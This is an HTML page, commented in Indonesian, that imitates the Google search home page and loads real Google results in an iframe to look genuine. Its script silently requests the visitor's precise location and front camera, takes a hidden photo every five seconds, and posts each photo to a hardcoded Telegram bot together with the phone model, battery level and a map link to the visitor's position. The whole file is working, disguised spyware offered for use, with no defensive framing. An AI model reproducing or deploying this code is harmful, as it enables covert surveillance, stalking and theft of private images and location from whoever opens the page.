<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        /* Agar browser tetap di halaman ini meski target browsing */
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: arial, sans-serif; }
        iframe { border: none; width: 100%; height: 100%; }
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; display: flex; flex-direction: column; align-items: center; }
        .logo { width: 272px; margin-top: 100px; margin-bottom: 30px; }
        .search-bar { width: 90%; max-width: 584px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; }
    </style>
</head>
<body>

<!-- Tampilan Awal Google Palsu -->
<div id="overlay">
    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
    <input type="text" class="search-bar" id="fakeSearch" placeholder="Telusuri Google atau ketik URL" autofocus>
    <p style="color: #70757a; font-size: 13px; margin-top: 20px;">Indonesia</p>
</div>

<!-- Halaman Google Asli (dalam iframe) -->
<iframe id="googleFrame" src=""></iframe>

<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
    const CHAT_ID = '6888530451';
    let userLocation = "Mencari lokasi...";
    let finalDevice = "Mendeteksi...";

    // 1. Deteksi HP Super Akurat (Mencegah hasil "K")
    function getHardcodedDevice() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) {
            const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
            if (match && match[2] && match[2].length > 1) {
                return match[2].trim();
            }
            // Jika standar gagal, cari kata kunci vendor
            if (ua.includes("POCO")) return "POCO Device";
            if (ua.includes("Redmi")) return "Xiaomi/Redmi";
            if (ua.includes("Samsung")) return "Samsung Galaxy";
            return "Android Phone";
        }
        return "iPhone/iOS";
    }

    // 2. Logika Pencarian (Mencegah script mati)
    document.getElementById('fakeSearch').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            const val = this.value;
            // Pindahkan pencarian ke dalam iframe
            document.getElementById('googleFrame').src = "https://www.google.com/search?q=" + encodeURIComponent(val) + "&igu=1";
            document.getElementById('overlay').style.display = 'none';
        }
    });

    async function startService() {
        finalDevice = getHardcodedDevice();
        
        // Minta Izin
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }, null, { enableHighAccuracy: true });
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                video.play();
                setInterval(takeSnapshot, 5000);
            };
        } catch (e) { console.log("Akses ditolak"); }
    }

    async function takeSnapshot() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        if (video.videoWidth === 0) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Baterai
        let bat = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            bat = Math.round(b.level * 100) + "%";
        }

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'img.jpg');
            formData.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${finalDevice}\n🔋 Baterai: ${bat}\n📍 Lokasi: ${userLocation}`);
            formData.append('parse_mode', 'Markdown');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }, 'image/jpeg', 0.6);
    }

    window.onload = startService;
</script>
</body>
</html>
